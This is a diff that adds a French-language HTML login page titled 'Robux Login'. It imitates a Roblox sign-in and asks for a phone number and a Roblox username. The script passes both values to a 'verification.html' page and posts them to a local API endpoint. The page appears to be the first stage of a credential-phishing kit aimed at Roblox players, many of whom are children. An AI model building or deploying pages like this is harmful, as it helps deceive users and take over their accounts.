@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 25%, #404040 50%, #2d2d2d 75%, #1a1a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-container {
+            background: #1e1e1e;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+            border: 2px solid #ffffff;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 60px;
+            height: 60px;
+            border-radius: 12px;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            color: #ffffff;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: #cccccc;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #cccccc;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        .country-flag {
+            width: 24px;
+            height: 16px;
+            background: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .country-flag svg {
+            width: 24px;
+            height: 16px;
+            display: block;
+        }
+
+        .country-flag-inside {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+        }
+        .country-flag-inside svg {
+            width: 24px;
+            height: 16px;
+            display: block;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #333;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            background: #2a2a2a;
+            color: #ffffff;
+        }
+
+        .form-group input.phone-input {
+            padding-left: 40px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ffffff;
+            background: #333;
+        }
+
+        .form-group input::placeholder {
+            color: #888;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #ffffff;
+            color: #1a1a1a;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            background: #ffffff;
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .error {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .success {
+            color: #51cf66;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .validation-error {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+            position: relative;
+            z-index: 9999;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: 1px solid #ff4444;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="logo.png" alt="Robux Logo">
+        </div>
+        
+        <h1 class="title">Robux</h1>
+        <p class="subtitle">Accédez à votre compte Roblox</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <div class="input-container" style="position: relative;">
+                    <span class="country-flag-inside">
+                        <svg viewBox="0 0 24 16" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="8" height="16" fill="#0055A4"/>
+                            <rect x="8" width="8" height="16" fill="#fff"/>
+                            <rect x="16" width="8" height="16" fill="#EF4135"/>
+                        </svg>
+                    </span>
+                    <input type="tel" id="phone" name="phone" class="phone-input" placeholder="Numéro de téléphone" required style="padding-left: 40px;" maxlength="14" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10).replace(/(.{2})/g,'$1 ').trim()">
+                </div>
+            </div>
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="Nom d'utilisateur Roblox" required>
+            </div>
+            
+            <button type="submit" class="submit-btn">Suivant</button>
+        </form>
+        
+        <div class="validation-error" id="validationError">
+            Veuillez remplir les informations requises
+        </div>
+        
+        <div id="message"></div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const username = document.getElementById('username').value;
+            const messageDiv = document.getElementById('message');
+            const validationError = document.getElementById('validationError');
+            
+            console.log('Phone:', phone);
+            console.log('Username:', username);
+            
+            // Masquer les messages précédents
+            validationError.style.display = 'none';
+            messageDiv.innerHTML = '';
+            
+            // Validation basique
+            if (!phone || !username) {
+                console.log('Champs vides - Affichage message d\'erreur');
+                validationError.style.display = 'block';
+                return;
+            }
+            
+            // Rediriger vers la page de vérification avec les données
+            window.location.href = `verification.html?phone=${encodeURIComponent(phone)}&username=${encodeURIComponent(username)}`;
+            
+            try {
+                const response = await fetch('http://localhost:3000/api/verification', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: phone,
+                        username: username
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    messageDiv.innerHTML = '<div class="success">✅ Connexion réussie !</div>';
+                } else {
+                    messageDiv.innerHTML = '<div class="error">❌ Erreur lors de la connexion</div>';
+                }
+            } catch (error) {
+                console.error('❌ Erreur:', error);
+                messageDiv.innerHTML = '<div class="error">❌ Erreur de connexion</div>';
+            }
+        });
+    </script>
+</body>
+</html> 
